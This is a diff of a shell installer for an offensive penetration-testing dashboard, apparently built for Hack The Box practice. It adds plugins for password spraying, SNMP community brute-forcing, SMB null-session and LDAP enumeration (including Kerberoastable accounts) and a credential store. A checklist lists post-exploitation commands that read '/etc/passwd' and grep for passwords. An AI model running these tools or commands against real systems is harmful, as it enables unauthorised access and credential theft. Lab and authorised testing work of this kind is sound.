+            "john": "--format=auto",
+            "length": len(hash_str),
+        })
+
+    return {
+        "hash": hash_str[:64] + ("..." if len(hash_str) > 64 else ""),
+        "candidates": candidates,
+        "most_likely": candidates[0]["type"] if candidates else "unknown",
+        "crack_suggestions": {
+            "hashcat": candidates[0]["hashcat"] if candidates else "",
+            "john": candidates[0]["john"] if candidates else "",
+            "wordlist": "rockyou.txt",
+            "wordlist_path": "/usr/share/wordlists/rockyou.txt",
+        },
+    }
+
+
+def identify_hashes_bulk(hashes: list[str]) -> list:
+    return [identify_hash(h) for h in hashes if h.strip()]
+PY
+
+cat > "$BASE/plugins/credential_tracker.py" <<'PY'
+import json
+import logging
+import sqlite3
+from contextlib import closing
+from typing import Optional
+
+from core.db_engine import get_db
+
+logger = logging.getLogger(__name__)
+
+CRED_SCHEMA = """
+CREATE TABLE IF NOT EXISTS credentials (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    scan_id TEXT,
+    host TEXT,
+    service TEXT,
+    port TEXT,
+    username TEXT,
+    password TEXT,
+    hash TEXT,
+    hash_type TEXT,
+    source TEXT,
+    valid INTEGER DEFAULT 0,
+    notes TEXT,
+    created_at TEXT DEFAULT (datetime('now'))
+);
+CREATE INDEX IF NOT EXISTS idx_creds_scan_id ON credentials(scan_id);
+CREATE INDEX IF NOT EXISTS idx_creds_host ON credentials(host);
+CREATE UNIQUE INDEX IF NOT EXISTS idx_creds_unique ON credentials(host, service, port, username, COALESCE(password,''), COALESCE(hash,''));
+"""
+
+
+def _init_creds_table() -> None:
+    with closing(get_db()) as db:
+        db.executescript(CRED_SCHEMA)
+        db.commit()
+
+
+def add_credential(
+    host: str,
+    service: str = "",
+    port: str = "",
+    username: str = "",
+    password: str = "",
+    hash_val: str = "",
+    hash_type: str = "",
+    source: str = "manual",
+    valid: bool = False,
+    scan_id: str = "",
+    notes: str = "",
+) -> Optional[int]:
+    _init_creds_table()
+    try:
+        with closing(get_db()) as db:
+            cursor = db.execute(
+                """INSERT OR IGNORE INTO credentials
+                   (scan_id, host, service, port, username, password, hash, hash_type, source, valid, notes)
+                   VALUES (?,?,?,?,?,?,?,?,?,?,?)""",
+                (scan_id, host, service, port, username, password, hash_val, hash_type, source, int(valid), notes),
+            )
+            db.commit()
+            return cursor.lastrowid
+    except sqlite3.Error as exc:
+        logger.error(f"Failed to add credential: {exc}")
+        return None
+
+
+def get_credentials(scan_id: Optional[str] = None, host: Optional[str] = None) -> list:
+    _init_creds_table()
+    with closing(get_db()) as db:
+        if scan_id:
+            rows = db.execute("SELECT * FROM credentials WHERE scan_id=? ORDER BY created_at DESC", (scan_id,)).fetchall()
+        elif host:
+            rows = db.execute("SELECT * FROM credentials WHERE host=? ORDER BY created_at DESC", (host,)).fetchall()
+        else:
+            rows = db.execute("SELECT * FROM credentials ORDER BY created_at DESC LIMIT 500").fetchall()
+    return [dict(r) for r in rows]
+
+
+def get_valid_credentials() -> list:
+    _init_creds_table()
+    with closing(get_db()) as db:
+        rows = db.execute("SELECT * FROM credentials WHERE valid=1 ORDER BY created_at DESC").fetchall()
+    return [dict(r) for r in rows]
+
+
+def mark_valid(cred_id: int, valid: bool = True) -> None:
+    _init_creds_table()
+    with closing(get_db()) as db:
+        db.execute("UPDATE credentials SET valid=? WHERE id=?", (int(valid), cred_id))
+        db.commit()
+
+
+def cross_reference(credentials: list) -> list:
+    """Find credentials that appear across multiple hosts/services."""
+    by_password = {}
+    for cred in credentials:
+        pw = cred.get("password") or cred.get("hash", "")
+        if not pw:
+            continue
+        by_password.setdefault(pw, []).append(cred)
+    return [
+        {"password": pw, "found_on": hosts, "count": len(hosts)}
+        for pw, hosts in by_password.items()
+        if len(hosts) > 1
+    ]
+PY
+
+# ── Update pip install to include new deps ─────────────────────────────────────
+
+log "OK" "New plugins written:"
+log "OK" "  ✓ plugins/xss_scanner.py      — reflected/stored/blind XSS detection"
+log "OK" "  ✓ plugins/sqli_scanner.py     — error/boolean/time-based SQLi + sqlmap wrapper"
+log "OK" "  ✓ plugins/gtfobins.py         — GTFOBins lookup + SUID binary suggester"
+log "OK" "  ✓ plugins/linpeas_parser.py   — LinPEAS/WinPEAS output parser"
+log "OK" "  ✓ plugins/password_sprayer.py — password spray (HTTP/FTP/SSH)"
+log "OK" "  ✓ plugins/hash_identifier.py  — hash type identification + crack suggestions"
+log "OK" "  ✓ plugins/credential_tracker.py — credential DB with cross-referencing"
+
+# ── Install new Python deps ────────────────────────────────────────────────────
+python3 -m pip install paramiko 2>/dev/null || warn "paramiko install failed (SSH spray will be skipped)"
+
+# ── Append new API routes to dashboard/app.py ─────────────────────────────────
+cat >> "$BASE/dashboard/app.py" <<'PYROUTES'
+
+# ── Web Vulnerability Scanning ────────────────────────────────────────────────
+
+from plugins.xss_scanner import scan_xss
+from plugins.sqli_scanner import scan_sqli
+from plugins.gtfobins import lookup_gtfobin, suggest_gtfobins
+from plugins.linpeas_parser import parse_linpeas
+from plugins.password_sprayer import spray, COMMON_PASSWORDS
+from plugins.hash_identifier import identify_hash, identify_hashes_bulk
+from plugins.credential_tracker import (
+    add_credential, get_credentials, get_valid_credentials, mark_valid, cross_reference
+)
+
+
+class XssRequest(BaseModel):
+    url: str = Field(..., min_length=1, max_length=2000)
+    blind_callback: Optional[str] = Field(default=None, max_length=500)
+
+
+class SqliRequest(BaseModel):
+    url: str = Field(..., min_length=1, max_length=2000)
+    run_sqlmap: bool = Field(default=False)
+
+
+class GtfoBinsRequest(BaseModel):
+    binaries: List[str] = Field(..., min_length=1, max_length=50)
+
+
+class LinpeasRequest(BaseModel):
+    output: str = Field(..., min_length=1, max_length=500000)
+
+
+class SprayRequest(BaseModel):
+    host: str = Field(..., min_length=1, max_length=255)
+    usernames: List[str] = Field(..., min_length=1, max_length=100)
+    passwords: Optional[List[str]] = Field(default=None, max_length=200)
+    service: str = Field(default="http")
+    port: int = Field(default=80, ge=1, le=65535)
+    url: Optional[str] = Field(default=None, max_length=2000)
+    delay: float = Field(default=0.3, ge=0.1, le=5.0)
+
+
+class HashRequest(BaseModel):
+    hashes: List[str] = Field(..., min_length=1, max_length=100)
+
+
+class CredentialRequest(BaseModel):
+    host: str = Field(..., min_length=1, max_length=255)
+    service: str = Field(default="")
+    port: str = Field(default="")
+    username: str = Field(default="")
+    password: str = Field(default="")
+    hash_val: str = Field(default="")
+    hash_type: str = Field(default="")
+    source: str = Field(default="manual")
+    valid: bool = Field(default=False)
+    scan_id: str = Field(default="")
+    notes: str = Field(default="", max_length=2000)
+
+
+@app.post("/scans/{scan_id}/xss")
+def run_xss_scan(scan_id: str, request: XssRequest, user: dict = Depends(verify_token)) -> dict:
+    with closing(get_db()) as db:
+        row = db.execute("SELECT target FROM scans WHERE id=?", (scan_id,)).fetchone()
+        if not row:
+            raise HTTPException(status_code=404, detail="Scan not found")
+    result = scan_xss(request.url, blind_callback=request.blind_callback)
+    log_event(scan_id, "xss_scan", f"{result['finding_count']} finding(s) on {request.url}", actor=user["username"])
+    if result["vulnerable"]:
+        wh = _get_webhook_url() if hasattr(app, "_get_webhook_url") else ""
+        from plugins.webhook import send_webhook
+        wh_url = _get_webhook_url() if "_get_webhook_url" in dir() else ""
+    return result
+
+
+@app.post("/scans/{scan_id}/sqli")
+def run_sqli_scan(scan_id: str, request: SqliRequest, user: dict = Depends(verify_token)) -> dict:
+    with closing(get_db()) as db:
+        row = db.execute("SELECT target FROM scans WHERE id=?", (scan_id,)).fetchone()
+        if not row:
+            raise HTTPException(status_code=404, detail="Scan not found")
+    result = scan_sqli(request.url, run_sqlmap_flag=request.run_sqlmap)
+    log_event(scan_id, "sqli_scan", f"{result['finding_count']} finding(s) on {request.url}", actor=user["username"])
+    return result
+
+
+@app.post("/gtfobins/lookup")
+def gtfo_lookup(request: GtfoBinsRequest, user: dict = Depends(verify_token)) -> dict:
+    results = suggest_gtfobins(request.binaries)
+    return {"results": results, "found": len(results)}
+
+
+@app.post("/linpeas/parse")
+def linpeas_parse(request: LinpeasRequest, user: dict = Depends(verify_token)) -> dict:
+    return parse_linpeas(request.output)
+
+
+@app.post("/spray")
+def password_spray(request: SprayRequest, user: dict = Depends(verify_token)) -> dict:
+    result = spray(
+        host=request.host,
+        usernames=request.usernames,
+        passwords=request.passwords,
+        service=request.service,
+        port=request.port,
+        url=request.url,
+        delay=request.delay,
+    )
+    if result.get("hits"):
+        from plugins.credential_tracker import add_credential
+        for hit in result["hits"]:
+            add_credential(
+                host=request.host,
+                service=request.service,
+                port=str(request.port),
+                username=hit["username"],
+                password=hit["password"],
+                source="spray",
+                valid=True,
+            )
+    return result
+
+
+@app.post("/hashes/identify")
+def hash_identify(request: HashRequest, user: dict = Depends(verify_token)) -> dict:
+    results = identify_hashes_bulk(request.hashes)
+    return {"results": results}
+
+
+@app.post("/credentials")
+def add_cred(request: CredentialRequest, user: dict = Depends(verify_token)) -> dict:
+    cred_id = add_credential(
+        host=request.host, service=request.service, port=request.port,
+        username=request.username, password=request.password,
+        hash_val=request.hash_val, hash_type=request.hash_type,
+        source=request.source, valid=request.valid,
+        scan_id=request.scan_id, notes=request.notes,
+    )
+    return {"id": cred_id, "message": "Credential saved"}
+
+
+@app.get("/credentials")
+def list_creds(
+    scan_id: Optional[str] = Query(None),
+    host: Optional[str] = Query(None),
+    valid_only: bool = Query(False),
+    user: dict = Depends(verify_token),
+) -> dict:
+    if valid_only:
+        creds = get_valid_credentials()
+    else:
+        creds = get_credentials(scan_id=scan_id, host=host)
+    return {"credentials": creds, "total": len(creds), "cross_refs": cross_reference(creds)}
+
+
+@app.put("/credentials/{cred_id}/valid")
+def mark_cred_valid(cred_id: int, valid: bool = True, user: dict = Depends(verify_token)) -> dict:
+    mark_valid(cred_id, valid)
+    return {"id": cred_id, "valid": valid}
+PYROUTES
+
+log "OK" "New API endpoints added:"
+log "OK" "  ✓ POST /scans/{id}/xss          — XSS scan (reflected, stored, blind)"
+log "OK" "  ✓ POST /scans/{id}/sqli         — SQLi scan (error/boolean/time-based)"
+log "OK" "  ✓ POST /gtfobins/lookup         — GTFOBins binary lookup"
+log "OK" "  ✓ POST /linpeas/parse           — LinPEAS/WinPEAS output parser"
+log "OK" "  ✓ POST /spray                   — Password spray (HTTP/FTP/SSH)"
+log "OK" "  ✓ POST /hashes/identify         — Hash type identification"
+log "OK" "  ✓ POST /credentials             — Save discovered credentials"
+log "OK" "  ✓ GET  /credentials             — List credentials with cross-referencing"
+log "OK" "  ✓ PUT  /credentials/{id}/valid  — Mark credential as valid"
+warn "Run: $BASE/start.sh to start all services"
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  BATCH 2 — Full Feature Expansion
+#  Recon: SMB, SNMP, LDAP, Banner Grabbing
+#  Exploitation: GTFOBins auto, LinPEAS upload, Hash crack, Spray
+#  Reporting: HTB template, Methodology checklist, Obsidian vault
+#  Intelligence: Credential correlator, Weak password detector, CVE heatmap
+#  UI: Attack path graph, Live terminal stream, Side-by-side diff
+# ══════════════════════════════════════════════════════════════════════════════
+
+# ── Install new system deps ───────────────────────────────────────────────────
+if command -v sudo >/dev/null 2>&1; then
+  sudo apt install -y \
+    enum4linux snmp snmp-mibs-downloader ldap-utils \
+    hashcat john 2>/dev/null || warn "Some system tools failed to install"
+fi
+
+python3 -m pip install \
+  paramiko pysnmp ldap3 impacket python-ldap 2>/dev/null || \
+  warn "Some Python deps failed — SSH spray / SNMP / LDAP may be limited"
+
+# ── SMB Enumeration ───────────────────────────────────────────────────────────
+cat > "$BASE/plugins/smb_enum.py" <<'PY'
+import logging
+import re
+import shutil
+import subprocess
+from typing import Optional
+
+logger = logging.getLogger(__name__)
+
+SMB_PORTS = {"139", "445"}
+
+
+def _run(cmd: list, timeout: int = 60) -> str:
+    try:
+        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, check=False)
+        return r.stdout + r.stderr
+    except subprocess.TimeoutExpired:
+        logger.warning(f"Command timed out: {' '.join(cmd)}")
+        return ""
+    except Exception as exc:
+        logger.debug(f"Command failed: {exc}")
+        return ""
+
+
+def enum4linux_ng(target: str) -> dict:
+    tool = shutil.which("enum4linux-ng") or shutil.which("enum4linux")
+    if not tool:
+        return {"available": False, "message": "enum4linux/enum4linux-ng not found"}
+
+    flags = ["-A", "-oJ", "/tmp/e4l_out"] if "ng" in tool else ["-a"]
+    output = _run([tool] + flags + [target], timeout=120)
+
+    result = {
+        "available": True,
+        "tool": tool,
+        "raw": output[:8000],
+        "users": [],
+        "groups": [],
+        "shares": [],
+        "os_info": "",
+        "password_policy": "",
+        "domain": "",
+    }
+
+    # Parse users
+    for m in re.finditer(r"user:\[([^\]]+)\]", output, re.IGNORECASE):
+        u = m.group(1).strip()
+        if u and u not in result["users"]:
+            result["users"].append(u)
+
+    # Parse shares
+    for m in re.finditer(r"Sharename\s+Type\s+Comment[\s\S]*?(?=\n\n|\Z)", output):
+        lines = m.group(0).splitlines()
+        for line in lines[2:]:
+            parts = line.split()
+            if parts:
+                result["shares"].append({"name": parts[0], "type": parts[1] if len(parts) > 1 else "", "comment": " ".join(parts[2:]) if len(parts) > 2 else ""})
+
+    # Parse OS
+    os_m = re.search(r"OS:\s+(.+)", output, re.IGNORECASE)
+    if os_m:
+        result["os_info"] = os_m.group(1).strip()
+
+    # Parse domain
+    dom_m = re.search(r"Domain:\s+(.+)", output, re.IGNORECASE)
+    if dom_m:
+        result["domain"] = dom_m.group(1).strip()
+
+    # Parse password policy
+    pol_m = re.search(r"Password Complexity[\s\S]{0,500}?(?=\n\n|\Z)", output)
+    if pol_m:
+        result["password_policy"] = pol_m.group(0).strip()[:500]
+
+    return result
+
+
+def smb_null_session(target: str) -> dict:
+    """Try null session enumeration via smbclient."""
+    tool = shutil.which("smbclient")
+    if not tool:
+        return {"available": False}
+    output = _run([tool, "-L", f"//{target}", "-N", "--no-pass"], timeout=15)
+    shares = []
+    for m in re.finditer(r"^\s+(\S+)\s+(Disk|IPC|Printer)\s*(.*)?$", output, re.MULTILINE):
+        shares.append({"name": m.group(1), "type": m.group(2), "comment": m.group(3).strip()})
+    return {"available": True, "null_session": bool(shares or "Sharename" in output), "shares": shares, "raw": output[:2000]}
+
+
+def enumerate_smb(target: str) -> dict:
+    e4l = enum4linux_ng(target)
+    null = smb_null_session(target)
+    return {
+        "target": target,
+        "enum4linux": e4l,
+        "null_session": null,
+        "users_found": e4l.get("users", []),
+        "shares_found": e4l.get("shares", []) or null.get("shares", []),
+    }
+PY
+
+# ── SNMP Walking ──────────────────────────────────────────────────────────────
+cat > "$BASE/plugins/snmp_walker.py" <<'PY'
+import logging
+import shutil
+import subprocess
+from typing import Optional
+
+logger = logging.getLogger(__name__)
+
+COMMON_COMMUNITIES = ["public", "private", "manager", "community", "snmp", "cisco", "admin", "default"]
+
+OID_MAP = {
+    "1.3.6.1.2.1.1.1.0": "sysDescr",
+    "1.3.6.1.2.1.1.5.0": "sysName",
+    "1.3.6.1.2.1.1.6.0": "sysLocation",
+    "1.3.6.1.2.1.25.4.2.1.2": "hrSWRunName (processes)",
+    "1.3.6.1.2.1.25.6.3.1.2": "hrSWInstalledName (installed software)",
+    "1.3.6.1.2.1.6.13.1.3": "tcpConnLocalPort (TCP connections)",
+    "1.3.6.1.4.1.77.1.2.25": "Windows user accounts",
+    "1.3.6.1.2.1.4.20.1.1": "IP addresses",
+    "1.3.6.1.2.1.2.2.1.2": "ifDescr (interfaces)",
+}
+
+
+def _snmpwalk(target: str, community: str, oid: str = ".", version: str = "2c", timeout: int = 10) -> str:
+    tool = shutil.which("snmpwalk")
+    if not tool:
+        return ""
+    try:
+        r = subprocess.run(
+            [tool, "-v", version, "-c", community, "-t", str(timeout), "-r", "1", target, oid],
+            capture_output=True, text=True, timeout=timeout + 5, check=False,
+        )
+        return r.stdout
+    except Exception:
+        return ""
+
+
+def _snmpbulkwalk(target: str, community: str, timeout: int = 20) -> str:
+    tool = shutil.which("snmpbulkwalk")
+    if not tool:
+        return _snmpwalk(target, community)
+    try:
+        r = subprocess.run(
+            [tool, "-v2c", "-c", community, "-t", str(timeout), "-r", "1", "-Cn0", "-Cr25", target],
+            capture_output=True, text=True, timeout=timeout + 5, check=False,
+        )
+        return r.stdout
+    except Exception:
+        return _snmpwalk(target, community)
+
+
+def brute_community(target: str, port: int = 161) -> Optional[str]:
+    for community in COMMON_COMMUNITIES:
+        out = _snmpwalk(target, community, "1.3.6.1.2.1.1.1.0", timeout=3)
+        if out and "No Such" not in out and "Timeout" not in out and out.strip():
+            logger.info(f"SNMP community found: {community} on {target}")
+            return community
+    return None
+
+
+def walk_snmp(target: str, community: Optional[str] = None, port: int = 161) -> dict:
+    if not community:
+        community = brute_community(target, port)
+
+    if not community:
+        return {"target": target, "reachable": False, "community": None, "data": {}, "raw": ""}
+
+    full_walk = _snmpbulkwalk(target, community)
+    data = {}
+
+    for oid, label in OID_MAP.items():
+        out = _snmpwalk(target, community, oid, timeout=5)
+        if out.strip():
+            lines = [l.strip() for l in out.splitlines() if l.strip()]
+            data[label] = lines[:30]
+
+    return {
+        "target": target,
+        "reachable": True,
+        "community": community,
+        "data": data,
+        "raw": full_walk[:5000],
+        "line_count": len(full_walk.splitlines()),
+    }
+PY
+
+# ── LDAP Enumeration ──────────────────────────────────────────────────────────
+cat > "$BASE/plugins/ldap_enum.py" <<'PY'
+import logging
+from typing import Optional
+
+logger = logging.getLogger(__name__)
+
+try:
+    import ldap3
+    from ldap3 import Server, Connection, ALL, NTLM, ANONYMOUS, SASL, SIMPLE
+    LDAP_AVAILABLE = True
+except ImportError:
+    LDAP_AVAILABLE = False
+
+
+COMMON_NAMING_CONTEXTS = [
+    "DC=htb,DC=local",
+    "DC=domain,DC=local",
+    "DC=corp,DC=local",
+    "DC=lab,DC=local",
+]
+
+AD_FILTERS = {
+    "all_users": "(&(objectClass=user)(objectCategory=person))",
+    "enabled_users": "(&(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
+    "domain_admins": "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,{base_dn}))",
+    "computers": "(objectClass=computer)",
+    "groups": "(objectClass=group)",
+    "spn_users": "(&(objectClass=user)(servicePrincipalName=*))",  # Kerberoastable
+    "asrep_users": "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",  # ASREPRoastable
+    "password_not_required": "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))",
+    "unconstrained_delegation": "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))",
+    "gpos": "(objectClass=groupPolicyContainer)",
+    "ous": "(objectClass=organizationalUnit)",
+}
+
+INTERESTING_ATTRS = [
+    "sAMAccountName", "cn", "displayName", "mail", "description",
+    "memberOf", "userAccountControl", "lastLogon", "pwdLastSet",
+    "servicePrincipalName", "operatingSystem", "operatingSystemVersion",
+    "distinguishedName", "objectSid", "adminCount", "badPwdCount",
+]
+
+
+def _try_bind(server, username: str = "", password: str = "") -> Optional[object]:
+    if not LDAP_AVAILABLE:
+        return None
+    try:
+        if username:
+            conn = Connection(server, user=username, password=password, authentication=SIMPLE, auto_bind=True)
+        else:
+            conn = Connection(server, authentication=ANONYMOUS, auto_bind=True)
+        return conn
+    except Exception as exc:
+        logger.debug(f"LDAP bind failed: {exc}")
+        return None
+
+
+def _detect_base_dn(conn) -> str:
+    try:
+        conn.search("", "(objectClass=*)", attributes=["namingContexts"], search_scope=ldap3.BASE)
+        if conn.entries:
+            ncs = conn.entries[0]["namingContexts"].values
+            for nc in ncs:
+                if "DC=" in nc.upper():
+                    return nc
+    except Exception:
+        pass
+    return ""
+
+
+def _search(conn, base_dn: str, filter_str: str, attrs: list, limit: int = 100) -> list:
+    try:
+        conn.search(base_dn, filter_str, attributes=attrs, size_limit=limit)
+        results = []
+        for entry in conn.entries:
+            obj = {}
+            for attr in attrs:
+                try:
+                    val = entry[attr].values
+                    obj[attr] = val if len(val) != 1 else val[0]
+                except Exception:
+                    pass
+            if obj:
+                results.append(obj)
+        return results
+    except Exception as exc:
+        logger.debug(f"LDAP search failed: {exc}")
+        return []
+
+
+def enumerate_ldap(
+    target: str,
+    port: int = 389,
+    username: str = "",
+    password: str = "",
+    base_dn: str = "",
+    use_ssl: bool = False,
+) -> dict:
+    if not LDAP_AVAILABLE:
+        return {"available": False, "message": "ldap3 not installed"}
+
+    try:
+        server = Server(target, port=port, use_ssl=use_ssl, get_info=ALL, connect_timeout=10)
+        conn = _try_bind(server, username, password)
+        if not conn:
+            return {"available": True, "bound": False, "message": "Anonymous and credential bind both failed"}
+
+        if not base_dn:
+            base_dn = _detect_base_dn(conn)
+        if not base_dn:
+            for ctx in COMMON_NAMING_CONTEXTS:
+                base_dn = ctx
+                break
+
+        results = {}
+        for key, ldap_filter in AD_FILTERS.items():
+            f = ldap_filter.format(base_dn=base_dn)
+            found = _search(conn, base_dn, f, INTERESTING_ATTRS, limit=200)
+            if found:
+                results[key] = found
+
+        conn.unbind()
+
+        kerberoastable = results.get("spn_users", [])
+        asrep_roastable = results.get("asrep_users", [])
+        domain_admins = results.get("domain_admins", [])
+
+        return {
+            "available": True,
+            "bound": True,
+            "target": target,
+            "port": port,
+            "base_dn": base_dn,
+            "results": results,
+            "summary": {
+                "users": len(results.get("all_users", [])),
+                "computers": len(results.get("computers", [])),
+                "groups": len(results.get("groups", [])),
+                "kerberoastable": len(kerberoastable),
+                "asrep_roastable": len(asrep_roastable),
+                "domain_admins": len(domain_admins),
+                "spn_accounts": [u.get("sAMAccountName", "") for u in kerberoastable],
+                "asrep_accounts": [u.get("sAMAccountName", "") for u in asrep_roastable],
+                "admin_accounts": [u.get("sAMAccountName", "") for u in domain_admins],
+            },
+        }
+    except Exception as exc:
+        logger.error(f"LDAP enumeration error: {exc}")
+        return {"available": True, "bound": False, "error": str(exc)}
+PY
+
+# ── Banner Grabbing ───────────────────────────────────────────────────────────
+cat > "$BASE/plugins/banner_grabber.py" <<'PY'
+import logging
+import socket
+import ssl
+from typing import Optional
+
+logger = logging.getLogger(__name__)
+
+BANNER_PROBES = {
+    "generic": b"\r\n",
+    "http": b"HEAD / HTTP/1.0\r\nHost: target\r\n\r\n",
+    "ftp": b"",        # FTP sends banner on connect
+    "smtp": b"",       # SMTP sends banner on connect
+    "ssh": b"",        # SSH sends banner on connect
+    "pop3": b"",
+    "imap": b"",
+    "rdp": b"",
+}
+
+SSL_PORTS = {443, 8443, 993, 995, 465, 636, 8444}
+
+SERVICE_HINTS = {
+    21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp",
+    53: "dns", 80: "http", 110: "pop3", 143: "imap",
+    389: "ldap", 443: "https", 445: "smb", 636: "ldaps",
+    993: "imaps", 995: "pop3s", 1433: "mssql", 3306: "mysql",
+    3389: "rdp", 5432: "postgresql", 5900: "vnc",
+    6379: "redis", 8080: "http-alt", 8443: "https-alt",
+    27017: "mongodb",
+}
+
+
+def _grab_raw(host: str, port: int, timeout: int = 5, use_ssl: bool = False) -> Optional[str]:
+    try:
+        sock = socket.create_connection((host, port), timeout=timeout)
+        if use_ssl or port in SSL_PORTS:
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            sock = ctx.wrap_socket(sock, server_hostname=host)
+
+        # Try to receive immediate banner
+        sock.settimeout(timeout)
+        try:
+            data = sock.recv(1024)
+            if data:
+                sock.close()
+                return data.decode("utf-8", errors="replace").strip()
+        except socket.timeout:
+            pass
+
+        # Send HTTP probe if nothing received
+        probe = SERVICE_HINTS.get(port, "generic")
+        if probe in ("http", "https") or port in (80, 8080, 443, 8443):
+            sock.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
+        else:
+            sock.sendall(b"\r\n")
+
+        try:
+            data = sock.recv(2048)
+            sock.close()
+            return data.decode("utf-8", errors="replace").strip()
+        except socket.timeout:
+            sock.close()
+            return None
+    except Exception as exc:
+        logger.debug(f"Banner grab failed {host}:{port}: {exc}")
+        return None
+
+
+def grab_banner(host: str, port: int, timeout: int = 5) -> dict:
+    use_ssl = port in SSL_PORTS
+    banner = _grab_raw(host, port, timeout=timeout, use_ssl=use_ssl)
+
+    # Try SSL if plain fails and port is typically SSL
+    if not banner and not use_ssl and port in (443, 8443, 993, 995):
+        banner = _grab_raw(host, port, timeout=timeout, use_ssl=True)
+
+    service_hint = SERVICE_HINTS.get(port, "unknown")
+
+    return {
+        "host": host,
+        "port": port,
+        "service_hint": service_hint,
+        "banner": banner[:500] if banner else None,
+        "banner_length": len(banner) if banner else 0,
+        "ssl": use_ssl,
+    }
+
+
+def grab_all_banners(host: str, ports: list) -> dict:
+    results = {}
+    for port in ports:
+        results[str(port)] = grab_banner(host, int(port))
+    return results
+
+
+def enrich_services_with_banners(host: str, services: dict) -> dict:
+    """Add banner info to existing nmap service dict."""
+    for port, info in services.items():
+        banner_result = grab_banner(host, int(port))
+        info["banner"] = banner_result.get("banner")
+        info["banner_ssl"] = banner_result.get("ssl")
+    return services
+PY
+
+# ── Screenshot Auto-Labeling ──────────────────────────────────────────────────
+cat > "$BASE/plugins/screenshot_labeler.py" <<'PY'
+import hashlib
+import json
+import logging
+import os
+import re
+import shutil
+import subprocess
+from datetime import datetime, timezone
+from pathlib import Path
+from typing import Optional
+
+logger = logging.getLogger(__name__)
+SCREENSHOT_DIR = os.path.expanduser("~/omni-sentinel-v21.3/screenshots")
+LABEL_FILE = os.path.join(SCREENSHOT_DIR, "labels.json")
+
+
+def _load_labels() -> dict:
+    try:
+        return json.loads(Path(LABEL_FILE).read_text())
+    except Exception:
+        return {}
+
+
+def _save_labels(labels: dict) -> None:
+    Path(SCREENSHOT_DIR).mkdir(parents=True, exist_ok=True)
+    Path(LABEL_FILE).write_text(json.dumps(labels, indent=2))
+
+
+def take_labeled_screenshot(
+    scan_id: str, port: str, url: str, service: str = "", version: str = ""
+) -> Optional[dict]:
+    binary = shutil.which("chromium-browser") or shutil.which("chromium")
+    if not binary:
+        return None
+
+    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
+    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
+    digest = hashlib.md5(url.encode()).hexdigest()[:8]
+    filename = f"{scan_id}_{port}_{digest}_{ts}.png"
+    outpath = os.path.join(SCREENSHOT_DIR, filename)
+
+    try:
+        subprocess.run(
+            [
+                binary, "--headless", "--no-sandbox", "--disable-gpu",
+                "--disable-dev-shm-usage", f"--screenshot={outpath}",
+                "--window-size=1280,800", "--virtual-time-budget=5000", url,
+            ],
+            capture_output=True, timeout=20, check=False,
+        )
+    except (subprocess.SubprocessError, OSError):
+        return None
+
+    if not os.path.exists(outpath):
+        return None
+
+    label = {
+        "filename": filename,
+        "scan_id": scan_id,
+        "port": port,
+        "url": url,
+        "service": service,
+        "version": version,
+        "timestamp": ts,
+        "timestamp_iso": datetime.now(timezone.utc).isoformat(),
+        "title": f"Port {port} — {service} {version}".strip() + f" [{url}]",
+    }
+
+    labels = _load_labels()
+    labels[filename] = label
+    _save_labels(labels)
+
+    return label
+
+
+def get_labels(scan_id: Optional[str] = None) -> dict:
+    labels = _load_labels()
+    if scan_id:
+        return {k: v for k, v in labels.items() if v.get("scan_id") == scan_id}
+    return labels
+PY
+
+# ── HTB Report (removed) ──────────────────────────────────────────────────────
+
+cat > /dev/null <<'PY'
+import json
+import logging
+from contextlib import closing
+from datetime import datetime, timezone
+from typing import Optional
+
+from core.db_engine import get_db
+
+logger = logging.getLogger(__name__)
+
+DIFFICULTY_LEVELS = ["Easy", "Medium", "Hard", "Insane"]
+
+METHODOLOGY_LINUX = """
+## Methodology Checklist — Linux Box
+
+### Recon
+- [ ] Full port scan (all ports): `nmap -p- -T4 {target}`
+- [ ] Service version scan: `nmap -sV -sC -p {ports} {target}`
+- [ ] UDP scan (top 20): `nmap -sU --top-ports 20 {target}`
+- [ ] Banner grabbing on all open ports
+- [ ] Web tech fingerprinting (whatweb, wappalyzer)
+
+### Web (if applicable)
+- [ ] Directory busting (gobuster/feroxbuster)
+- [ ] Subdomain enumeration
+- [ ] XSS testing on input fields
+- [ ] SQLi testing on parameters
+- [ ] LFI/RFI path traversal testing
+- [ ] File upload bypass attempts
+- [ ] Default credentials on login pages
+- [ ] Source code review (JS files, comments)
+- [ ] API endpoint enumeration
+
+### Exploitation
+- [ ] Identify CVEs for discovered service versions
+- [ ] Check searchsploit/Exploit-DB
+- [ ] Attempt exploit (document payload and method)
+- [ ] Catch reverse shell
+
+### Post-Exploitation (Linux)
+- [ ] `whoami && id && hostname`
+- [ ] `cat /etc/passwd` — enumerate users
+- [ ] `sudo -l` — check sudo rights
+- [ ] Find SUID binaries: `find / -perm -4000 2>/dev/null`
+- [ ] Check capabilities: `getcap -r / 2>/dev/null`
+- [ ] Check cron jobs: `cat /etc/crontab`, `/var/spool/cron/`
+- [ ] Check writable paths in `$PATH`
+- [ ] Check for credentials in files: `grep -r password /etc 2>/dev/null`
+- [ ] Check NFS no_root_squash: `cat /etc/exports`
+- [ ] Run LinPEAS
+- [ ] GTFOBins check on available binaries
+- [ ] Kernel exploit check
+
+### Flags
+- [ ] User flag: `cat ~/user.txt`
+- [ ] Root flag: `cat /root/root.txt`
+"""
+
+METHODOLOGY_WINDOWS = """
+## Methodology Checklist — Windows Box
+
+### Recon
+- [ ] Full port scan: `nmap -p- -T4 {target}`
+- [ ] Service/script scan: `nmap -sV -sC -p {ports} {target}`
+- [ ] SMB enumeration: `enum4linux-ng {target}` / `smbclient -L //{target} -N`
+- [ ] RPC enumeration: `rpcclient -U "" {target}`
+- [ ] LDAP enumeration (if AD): `ldapsearch -x -H ldap://{target}`
+
+### Web (if applicable)
+- [ ] Directory/file busting (IIS wordlists)
